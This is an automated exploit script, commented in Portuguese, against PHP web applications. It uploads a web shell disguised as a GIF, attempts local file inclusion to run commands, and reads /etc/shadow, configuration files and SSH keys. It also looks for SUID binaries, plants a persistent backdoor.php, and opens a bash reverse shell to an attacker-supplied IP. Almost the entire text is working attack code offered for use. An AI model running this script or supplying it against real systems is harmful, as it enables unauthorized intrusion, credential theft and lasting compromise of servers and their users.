#!/usr/bin/env python3
import requests
import re
import sys
from urllib.parse import urljoin

# === CONFIGURAÇÃO ===
BASE = "https://exemplo.com/app/"
PHPINFO_URL = urljoin(BASE, "phpinfo.php")
UPLOAD_PATHS = ["upload.php", "enviar.php", "submit.php", "upload_image.php"]
FILE_FIELDS = ["file", "upload", "arquivo", "imagem"]
ATTACKER_IP = "SEU_IP_AUTORIZADO"  # <-- SUBSTITUA pelo seu IP real
ATTACKER_PORT = 4444

# === FUNÇÕES ===
def get_tmp_path():
    print("[*] Coletando tmp_path da página phpinfo...")
    resp = requests.get(PHPINFO_URL)
    html = resp.text

    # 1. Formato clássico
    m = re.search(r"upload_tmp_dir\s+=>\s+([^\s<]+)", html, re.IGNORECASE)
    if m:
        tmp_path = m.group(1)
        print(f"[+] tmp path detectado (formato =>): {tmp_path}")
        return tmp_path

    # 2. Formato HTML
    m = re.search(r'<td class="e">upload_tmp_dir<\/td><td class="v">([^<]+)<\/td>', html)
    if m:
        tmp_path = m.group(1).strip()
        print(f"[+] tmp path detectado (formato HTML): {tmp_path}")
        return tmp_path

    print("[-] Upload temp path não encontrado no phpinfo.")
    sys.exit()

def fuzz_upload(tmp_path):
    payload = b"GIF89a;\n<?php system($_GET['cmd']); ?>"
    for endpoint in UPLOAD_PATHS:
        full_url = urljoin(BASE, endpoint)
        for field in FILE_FIELDS:
            print(f"[*] Testando upload em {full_url} com campo '{field}'...")
            files = {
                field: ("shell.php.gif", payload, "image/gif")
            }
            try:
                resp = requests.post(full_url, files=files, timeout=5)
                if resp.status_code == 200:
                    print(f"[+] Upload possivelmente aceito em {full_url}")
                    return f"{tmp_path}/shell.php.gif"
            except:
                continue
    print("[-] Nenhum endpoint de upload funcionou.")
    sys.exit()

def try_lfi(shell_tmp_path):
    lfi_params = ["file", "page", "load", "include"]
    for param in lfi_params:
        print(f"[*] Tentando LFI via param: ?{param}={shell_tmp_path}")
        resp = requests.get(PHPINFO_URL, params={param: shell_tmp_path, "cmd": "whoami"})
        if "uid=" in resp.text or "apache" in resp.text or "www-data" in resp.text:
            print(f"[+] Execução bem-sucedida! {param} = {shell_tmp_path}")
            print(resp.text)
            return param
    print("[-] Nenhuma inclusão LFI teve sucesso.")
    return None

def reverse_shell(shell_tmp_path, param, attacker_ip, attacker_port=4444):
    print(f"[*] Iniciando shell reverso para {attacker_ip}:{attacker_port}")
    payload = f"bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'"
    try:
        requests.get(PHPINFO_URL, params={
            param: shell_tmp_path,
            "cmd": payload
        }, timeout=3)
        print("[+] Payload enviado. Aguarde conexão no netcat.")
    except:
        print("[*] Timeout esperado. Verifique o listener.")

def criar_backdoor_arquivo(shell_tmp_path, param):
    print("[*] Tentando criar backdoor permanente...")
    bd_code = "<?php system($_GET['cmd']); ?>"
    cmd = f"echo \"{bd_code}\" > /var/www/html/backdoor.php"
    try:
        requests.get(PHPINFO_URL, params={param: shell_tmp_path, "cmd": cmd})
        print("[+] Backdoor criado: /backdoor.php")
    except:
        print("[-] Falha ao criar persistência.")

def procurar_suids(shell_tmp_path, param):
    print("[*] Procurando binários SUID para escalonamento...")
    cmd = "find / -perm -4000 -type f 2>/dev/null"
    resp = requests.get(PHPINFO_URL, params={param: shell_tmp_path, "cmd": cmd})
    if resp.status_code == 200:
        print("[+] Possíveis vetores de privilege escalation:")
        print(resp.text)

def extrair_arquivos(shell_tmp_path, param):
    arquivos = ["/etc/passwd", "/etc/shadow", "/var/www/html/config.php", "/.ssh/id_rsa"]
    for arq in arquivos:
        print(f"[*] Tentando ler {arq}...")
        try:
            r = requests.get(PHPINFO_URL, params={param: shell_tmp_path, "cmd": f"cat {arq}"})
            if r.status_code == 200 and len(r.text) > 10:
                print(f"[+] {arq}:\n{r.text[:300]}...\n")
        except:
            continue

# === EXECUÇÃO PRINCIPAL ===
if __name__ == "__main__":
    print("[*] Iniciando exploit automatizado...")
    tmp = get_tmp_path()
    shell_path = fuzz_upload(tmp)
    param = try_lfi(shell_path)

    if param:
        extrair_arquivos(shell_path, param)
        procurar_suids(shell_path, param)
        criar_backdoor_arquivo(shell_path, param)
        reverse_shell(shell_path, param, ATTACKER_IP, ATTACKER_PORT)
    else:
        print("[-] Exploração falhou.")
